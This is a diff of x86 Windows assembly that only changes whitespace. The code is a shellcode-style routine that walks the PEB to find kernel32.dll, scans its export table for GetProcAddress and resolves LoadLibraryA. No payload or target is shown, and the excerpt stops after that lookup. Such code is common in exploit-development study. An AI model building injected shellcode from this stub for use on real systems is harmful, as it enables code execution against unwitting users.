@@ -96,60 +96,60 @@ _start:
 
 
 getkernel32:
-	xor ecx, ecx				; zeroing register ECX
-	mul ecx						; zeroing register EAX EDX
-	mov eax, [fs:ecx + 0x030]	; PEB loaded in eax
-	mov eax, [eax + 0x00c]		; LDR loaded in eax
-	mov esi, [eax + 0x014]		; InMemoryOrderModuleList loaded in esi
-	lodsd						; program.exe address loaded in eax (1st module)
+	xor ecx, ecx                ; zeroing register ECX
+	mul ecx                     ; zeroing register EAX EDX
+	mov eax, [fs:ecx + 0x030]   ; PEB loaded in eax
+	mov eax, [eax + 0x00c]      ; LDR loaded in eax
+	mov esi, [eax + 0x014]      ; InMemoryOrderModuleList loaded in esi
+	lodsd                       ; program.exe address loaded in eax (1st module)
 	xchg esi, eax				
-	lodsd						; ntdll.dll address loaded (2nd module)
-	mov ebx, [eax + 0x10]		; kernel32.dll address loaded in ebx (3rd module)
+	lodsd                       ; ntdll.dll address loaded (2nd module)
+	mov ebx, [eax + 0x10]       ; kernel32.dll address loaded in ebx (3rd module)
 
 	; EBX = base of kernel32.dll address
 
 getAddressofName:
-	mov edx, [ebx + 0x3c]		; load e_lfanew address in ebx
+	mov edx, [ebx + 0x3c]       ; load e_lfanew address in ebx
 	add edx, ebx				
-	mov edx, [edx + 0x78]		; load data directory
+	mov edx, [edx + 0x78]       ; load data directory
 	add edx, ebx
-	mov esi, [edx + 0x20]		; load "address of name"
+	mov esi, [edx + 0x20]       ; load "address of name"
 	add esi, ebx
 	xor ecx, ecx
 
 	; ESI = RVAs
 
 getProcAddress:
-	inc ecx 							; ordinals increment
-	lodsd								; get "address of name" in eax
+	inc ecx                             ; ordinals increment
+	lodsd                               ; get "address of name" in eax
 	add eax, ebx				
-	cmp dword [eax], 0x50746547			; GetP
+	cmp dword [eax], 0x50746547         ; GetP
 	jnz getProcAddress
-	cmp dword [eax + 0x4], 0x41636F72	; rocA
+	cmp dword [eax + 0x4], 0x41636F72   ; rocA
 	jnz getProcAddress
-	cmp dword [eax + 0x8], 0x65726464	; ddre
+	cmp dword [eax + 0x8], 0x65726464   ; ddre
 	jnz getProcAddress
 
 getProcAddressFunc:
-	mov esi, [edx + 0x24]		; offset ordinals
-	add esi, ebx 				; pointer to the name ordinals table
-	mov cx, [esi + ecx * 2] 	; CX = Number of function
+	mov esi, [edx + 0x24]       ; offset ordinals
+	add esi, ebx                ; pointer to the name ordinals table
+	mov cx, [esi + ecx * 2]     ; CX = Number of function
 	dec ecx
-	mov esi, [edx + 0x1c]    	; ESI = Offset address table
-	add esi, ebx             	; we placed at the begin of AddressOfFunctions array
-	mov edx, [esi + ecx * 4] 	; EDX = Pointer(offset)
-	add edx, ebx             	; EDX = getProcAddress
-	mov ebp, edx 				; save getProcAddress in EBP for future purpose
+	mov esi, [edx + 0x1c]       ; ESI = Offset address table
+	add esi, ebx                ; we placed at the begin of AddressOfFunctions array
+	mov edx, [esi + ecx * 4]    ; EDX = Pointer(offset)
+	add edx, ebx                ; EDX = getProcAddress
+	mov ebp, edx                ; save getProcAddress in EBP for future purpose
 
 getLoadLibraryA:
-	xor ecx, ecx 				; zeroing ecx
-	push ecx 					; push 0 on stack
-	push 0x41797261   			; 
-	push 0x7262694c				;  AyrarbiLdaoL
-	push 0x64616f4c 			;
+	xor ecx, ecx                ; zeroing ecx
+	push ecx                    ; push 0 on stack
+	push 0x41797261             ; 
+	push 0x7262694c             ;  AyrarbiLdaoL
+	push 0x64616f4c             ;
 	push esp
-	push ebx 					; kernel32.dll
-	call edx 					; call GetProcAddress and find LoadLibraryA address
+	push ebx                    ; kernel32.dll
+	call edx                    ; call GetProcAddress and find LoadLibraryA address
 
 	; EAX 76392864 kernel32.LoadLibraryA
     ; ECX 76340000 kernel32.76340000
